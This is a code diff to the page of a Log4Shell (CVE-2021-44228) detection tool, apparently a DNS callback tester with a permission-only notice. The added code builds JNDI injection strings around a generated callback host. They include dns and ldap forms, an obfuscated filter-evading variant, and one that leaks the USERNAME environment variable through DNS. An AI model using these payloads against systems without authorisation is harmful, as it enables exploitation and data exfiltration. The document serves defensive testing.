@@ -27,36 +27,38 @@
 </head>
 <body>
 <div class="container">
-    <h1>DNS Query Vulnerability Tester</h1>
+    <h1>DNS Query Vulnerability Tester (beta)</h1>
 
     <p>
-        While investigating software that is affected by CVE-2021-44228, it is necessary to test whether services
-        can be provoked to look up a name using DNS, potentially exposing information from the internal
-        infrastructure.
-        Use this tool to detect vulnerable Log4j versions or any other software that attempts
-        to either signal to a third party that there may be vulnerable systems, or even to
-        exfiltrate information via name lookups.
+        Using this tool you can investigate signs of your infrastructure being affected by CVE-2021-44228.
+        Primarily, it will let you test for patterns that triggers DNS lookups, potentially with side effects
+        like executing code on the target or to exfiltrate environment variables.
+        For tests of LDAP access, we recommend another tool, that also served as inspiration for this: <a href="https://log4shell.huntress.com/">Huntress Log4Shell</a>  Vulnerability Tester.
     </p>
 
     <div class="alert alert-info" role="alert">
         Using addresses produced by this tool will make it possible to detect whether your servers are trying to look up
-        the
-        name. The addresses that you create are unique, and information about attempts of using the address
+        an address provided by this service, and any results will be shown here.
+        The addresses that you create are unique, and information about attempts of using the address
         is only shared with this page, while you have this window open.
     </div>
 
-    <div>
-        Usage:
-        <ol>
-            <li>Copy one of the generated strings, and paste it into an application you would like to test.</li>
-            <li>If you see output in the table, it means there is high likelihood of vulnerabilities.</li>
-            <li>Additional information, retrieved from your service. This is only possible if you modify the generated
-                address further, though.
-            </li>
-        </ol>
-    </div>
-    <div class="alert alert-warning" role="alert">
-        <b>Conditional use</b>. You may only use this tool with systems which you have explicit permission to test.
+    <div class="row">
+        <div class="col">
+            Usage:
+            <ol>
+                <li>Press <span class="badge bg-light text-dark">Get Address</span> button below.</li>
+                <li>Press <span class="badge bg-light text-dark">Copy</span> on the bottom text</li>
+                <li>Paste the text into an application field you would like to test.</li>
+                <li>If you see output in the table, it means there is high likelihood of vulnerabilities.</li>
+            </ol>
+        </div>
+        <div class="col">
+            <div class="alert alert-warning" role="alert">
+                <b>Condition of use</b>. You may only use this tool with systems that you have explicit permission to
+                test.
+            </div>
+        </div>
     </div>
     <div>
         Notes:
@@ -67,6 +69,7 @@
             <li><strong>You can only use one address at a time</strong>. When you request a new address, the previous
                 are no longer
                 usable.
+
             </li>
         </ul>
     </div>
@@ -94,11 +97,13 @@
                 <div class="input-group mb-3">
                     <button class="btn btn-outline-info btn-sm" @click="copyUrl(address)">Copy
                     </button>
-                    <transition v-if="depletedUrl"  name="fade" :duration="1000">
-                        <button type="button" disabled data-bs-toggle="tooltip" data-bs-placement="top" class="btn btn-outline-secondary" title="A DNS lookup has been seen using this address,
+                    <transition v-if="depletedUrl" name="fade" :duration="1000">
+                        <button type="button"  data-bs-toggle="tooltip" data-bs-placement="top"
+                                class="btn btn-outline-secondary" title="A DNS lookup has been seen using this address,
 and any additional use will likely not work as
-resolvers caches this information.">
-                            Depleted
+resolvers caches this information.
+Get a new address!">
+                            Used
                         </button>
                     </transition>
                     <input type="text" v-model="address" class="form-control">
@@ -106,11 +111,25 @@ resolvers caches this information.">
                 <div class="input-group mb-2">
                     <button class="btn btn-outline-info btn-sm" id="button-vuln1" @click="copyUrl(vuln1)">Copy
                     </button>
-                    <transition v-if="depletedUrl"  name="fade" :duration="1000">
-                        <button type="button" disabled data-bs-toggle="tooltip" data-bs-placement="top" class="btn btn-outline-secondary" title="A DNS lookup has been seen using this address,
+                    <button type="button" class="btn btn-outline-info dropdown-toggle dropdown-toggle-split"
+                            data-bs-toggle="dropdown" aria-expanded="false">
+                        <span class="visually-hidden">Toggle Dropdown</span>
+                    </button>
+                    <ul class="dropdown-menu">
+                        <li><a class="dropdown-item" @click="selected=1">:jndi:dns:</a></li>
+                        <li><a class="dropdown-item" @click="selected=2">:jndi:ldap:</a></li>
+                        <li><a class="dropdown-item" @click="selected=3">Obfuscated :jndi:dns:</a></li>
+                        <li><hr class="dropdown-divider"></li>
+                        <li><a class="dropdown-item" aria-disabled="true">Select one option above - then press copy</a></li>
+                    </ul>
+
+                    <transition v-if="depletedUrl" name="fade" :duration="1000">
+                        <button type="button"  data-bs-toggle="tooltip" data-bs-placement="top"
+                                class="btn btn-outline-secondary" title="A DNS lookup has been seen using this address,
 and any additional use will likely not work as
-resolvers caches this information.">
-                            Depleted
+resolvers caches this information.
+Get a new address!">
+                            Used
                         </button>
                     </transition>
                     <input type="text" v-model="vuln1" class="form-control" aria-describedby="button-vuln1"></input>
@@ -163,19 +182,36 @@ resolvers caches this information.">
         data: function () {
             return {
                 address: '',
-                vuln1: '',
                 listenActive: false,
                 rowData: [],
                 depletedUrl: false,
+                selected: 1,
             }
+        },
+        computed: {
+            vuln1: function() {
+                switch (this.selected) {
+                    case 1:
+                        console.log("selected is 1")
+                        return "${jndi:dns://" + this.address + "/a}";
+                    case 2:
+                        return "${jndi:ldap://" + this.address + "/a}";
+                        break;
+                    case 3:
+                        return "${${env:lsweqw:-j}ndi${env:lsweqw:-:}${env:lsweqw:-d}ns${env:lsweqw:-:}//" +
+                            this.address + "/a}";
+                    case 4:
+                        return "${jndi:dns://${env:USERNAME}" + this.address + "/a}";
+                    default:
+                        this.vuln = '';
+                }
+            }
+
         },
         methods: {
             setAddress(url) {
                 this.address = url;
                 this.depletedUrl = false;
-
-                //this.vuln1 = "${jndi:ldap:" + this.address + "/a}";
-                this.vuln1 = "${jndi:dns://" + this.address + "/a}";
             },
             copyUrl(data) {
                 try {
@@ -194,7 +230,9 @@ resolvers caches this information.">
                 };
                 this.rowData.push(new_row)
                 this.depletedUrl = this.depletedUrl || message.DepletedUrl
-
+            },
+            switchSelect(event) {
+                this.selected = event.target.value;
             }
         }
     }
